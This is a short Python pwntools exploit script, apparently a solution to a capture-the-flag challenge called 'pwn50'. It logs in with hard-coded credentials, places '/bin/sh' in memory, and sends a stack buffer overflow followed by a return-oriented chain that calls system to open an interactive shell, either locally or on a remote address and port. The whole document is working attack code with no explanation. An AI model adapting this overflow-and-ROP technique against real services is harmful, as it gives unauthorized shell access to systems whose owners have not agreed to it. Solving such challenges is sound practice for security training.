#!/usr/bin/env python
# -*- coding: utf-8 -*-

import sys
from pwn import *

context(arch='amd64', os='linux')
context.log_level = 'debug'

fn = './pwn50'
elf = ELF(fn)

offset = 0x50 + 8
username = 'admin'
password = 'T6OBSh2i'
cmd = 0x601100  # bss
pop_rdi = 0x00400b03  # : pop rdi ; ret  ;

if len(sys.argv) == 1:
    io = process(fn)
else:
    io = remote('47.104.16.75', 9000)

io.sendlineafter(': ', username)
io.sendlineafter(': ', password)

io.sendlineafter(': ', '1')  # exec command
io.sendlineafter(': ', '/bin/sh')

pls = [
    '3' * offset,
    p64(pop_rdi),
    p64(cmd),
    p64(elf.symbols['system']),
]

payload = ''.join(pls)

io.sendafter(':', payload)

io.interactive()
